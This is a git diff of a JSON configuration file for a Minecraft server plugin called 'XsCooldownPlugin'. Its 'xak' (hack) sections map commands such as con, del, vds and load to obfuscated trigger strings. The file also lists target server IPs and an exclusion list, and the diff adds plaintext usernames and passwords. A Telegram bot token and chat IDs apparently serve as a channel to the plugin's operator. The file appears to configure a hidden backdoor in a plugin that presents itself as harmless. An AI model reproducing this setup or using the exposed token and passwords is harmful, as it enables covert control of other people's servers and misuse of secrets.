@@ -1,78 +1,92 @@
 {
-  "XsCooldownPlugin": {
-    "enable": [
-      {"enable": "true"}
-    ],
-    "check_status": [
-      {"enable": "true"}
-    ],
-    "request_servers": [
-      {"enable": "false"}
-    ],
-    "servers": [
-      {"ip": "46.174.53.249", "port": "25569"},
-      {"ip": "98.76.54.32", "port": "25565"}
-    ],
-    "xak": [
-      {"con": "~先换订E单单~"},
-      {"del": "~会看看订单通~"},
-      {"vds": "~已经当叮当叮当~"},
-      {"user": "~有人线上唱~"},
-      {"load": "mc.reallyworld.ru"},
-      {"auth": "~~auth~~"},
-      {"enable": "true"}
-    ],
-    "xak_off_for": [
-      {"ip": "65.108.21.200", "port": "25846"}
-    ],
-    "PLUGIN_MANAGER": [
-      {"PLUGIN_VER_NEW": "1.3-Beta-Sv2.0.1"},
-      {"AUTHOR_NAME": "Shevchik"},
-      {"AUTHOR_TELEGRAM": "t.me/Shevchik"},
-      {"AUTHOR_DISCORD": "Shevchik"}
-    ]
-  },
- 
-  "TEST": {
-    "enable": [
-      {"enable": "true"}
-    ],
-    "check_status": [
-      {"enable": "true"}
-    ],
-    "request_servers": [
-      {"enable": "false"}
-    ],
-    "servers": [
-      {"ip": "54.38.62.44", "port": "25565"},
-      {"ip": "98.76.54.32", "port": "25565"}
-    ],
-    "xak": [
-      {"con": "98ed89de8de8edejdjejedd8de"},
-      {"del": "~YHEYEYUEHHDHDHelete~"},
-      {"vds": "~VDSuYE^&&#^e~"},
-      {"user": "user_chat_command"},
-      {"enable": "true"}
-    ],
-    "xak_off_for": [
-      {"ip": "46.174.53.248", "port": "-"}
-    ],
-    "PLUGIN_MANAGER": [
-      {"PLUGIN_VER_NEW": "1.2"},
-      {"AUTHOR_NAME": "LPVania"},
-      {"AUTHOR_TELEGRAM": "t.me/LPVania"},
-      {"AUTHOR_DISCORD": "XSDpeed"}
-    ]
-  },
-
- 
- 
- 
- 
-  "GLOBAL_REQUEST": "~requestlisetmypludedegdeineuydeggdeed~",
- 
-  "Telegram_Token": "7300062086:AAFBxCrjG9b1PZvYLwZqNGWBa483S9Un_lM",
-  "Telegram_IDs": [
-    "1031151609"
-  ]
-}
+    "XsCooldownPlugin": {
+      "enable": [
+        {"enable": "true"}
+      ],
+      "check_status": [
+        {"enable": "true"}
+      ],
+      "request_servers": [
+        {"enable": "false"}
+      ],
+      "servers": [
+        {"ip": "46.174.53.249", "port": "25569"},
+        {"ip": "98.76.54.32", "port": "25565"}
+      ],
+      "xak": [
+        {"con": "~先换订E单单~"},
+        {"del": "~会看看订单通~"},
+        {"vds": "~已经当叮当叮当~"},
+        {"user": "~有人线上唱~"},
+        {"load": "mc.reallyworld.ru"},
+        {"auth": "~~auth~~"},
+        {"enable": "true"}
+      ],
+      "xak_off_for": [
+        {"ip": "65.108.21.200", "port": "25846"}
+      ],
+      "auth_users": [
+        {"user": "REPOR_1234", "pass": "dgdegdegde"}
+      ],
+      "PLUGIN_MANAGER": [
+        {"PLUGIN_VER_NEW": "1.3-Beta-Sv2.0.1"},
+        {"AUTHOR_NAME": "Shevchik"},
+        {"AUTHOR_TELEGRAM": "t.me/Shevchik"},
+        {"AUTHOR_DISCORD": "Shevchik"}
+      ]
+    },
+   
+    "TEST": {
+      "enable": [
+        {"enable": "true"}
+      ],
+      "check_status": [
+        {"enable": "true"}
+      ],
+      "request_servers": [
+        {"enable": "false"}
+      ],
+      "servers": [
+        {"ip": "54.38.62.44", "port": "25565"},
+        {"ip": "98.76.54.32", "port": "25565"}
+      ],
+      "xak": [
+        {"con": "98ed89de8de8edejdjejedd8de"},
+        {"del": "~YHEYEYUEHHDHDHelete~"},
+        {"vds": "~VDSuYE^&&#^e~"},
+        {"user": "user_chat_command"},
+        {"enable": "true"}
+      ],
+      "xak_off_for": [
+        {"ip": "46.174.53.248", "port": "-"}
+      ],
+      "PLUGIN_MANAGER": [
+        {"PLUGIN_VER_NEW": "1.2"},
+        {"AUTHOR_NAME": "LPVania"},
+        {"AUTHOR_TELEGRAM": "t.me/LPVania"},
+        {"AUTHOR_DISCORD": "XSDpeed"}
+      ]
+    },
+  
+   
+   
+   
+   
+    "GlobalSettings": {
+        "enable_auth": "true",
+        "global_auth": {
+          "users": [
+            {"user": "REPOR_1234", "pass": "passdgdegdegdeword1"}
+            
+          ]
+        },
+        "global_request": "~requestlisetmypludedegdeineuydeggdeed~",
+        "telegram": {
+          "token": "7300062086:AAFBxCrjG9b1PZvYLwZqNGWBa483S9Un_lM",
+          "ids": [
+            "1031151609"
+          ]
+        }
+      }
+  }
+  
